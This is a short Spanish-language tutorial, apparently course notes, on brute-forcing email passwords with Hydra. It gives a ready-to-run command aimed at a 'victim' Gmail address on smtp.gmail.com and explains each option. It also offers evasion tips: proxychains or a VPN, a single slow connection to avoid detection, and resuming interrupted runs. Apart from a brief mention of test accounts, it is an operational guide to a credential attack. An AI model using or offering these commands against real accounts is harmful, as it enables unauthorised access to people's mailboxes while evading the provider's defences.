# Fuerza Bruta a Cuentas de Correo con Hydra

Llevaremos a la práctica un ataque de fuerza bruta a cuentas de correo electrónico utilizando la herramienta **Hydra**.

> **Nota:** Se recomienda usar una VPN o el comando `proxychains4` por seguridad. Utiliza cuentas de prueba para no comprometer servicios reales.

## Advertencias de Seguridad
Algunos servidores detectan solicitudes continuas y envían **falsos positivos** (indican que una contraseña es correcta cuando no lo es) para distraer el ataque o bloquean la cuenta tras varios intentos.

## Ejecución del Ataque
Se recomienda limitar el número de peticiones paralelas para evitar ser detectado rápidamente.

```bash
hydra -S -l victima@gmail.com -P passwords.txt -e ns -V -t 1 -s 465 smtp.gmail.com smtp
```

### Descripción de opciones:
*   **`-S`**: Realiza una conexión SSL.
*   **`-l`**: Determina el email de la víctima.
*   **`-L`**: Archivo con lista de emails.
*   **`-P`**: Archivo con lista de contraseñas.
*   **`-e nsr`**: Intenta con password nulo (`n`), el mismo usuario como password (`s`) y el usuario al revés (`r`).
*   **`-V`**: Muestra el progreso del ataque (verbosidad).
*   **`-F`**: Finaliza el ataque al encontrar la primera credencial válida.
*   **`-t 1`**: Ejecuta 1 conexión en paralelo (más lento pero más discreto).
*   **`-s 465`**: Asigna el puerto SMTP.

### Reanudar el ataque
Si el proceso se interrumpe, puedes retomarlo con:
```bash
hydra -R
```

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
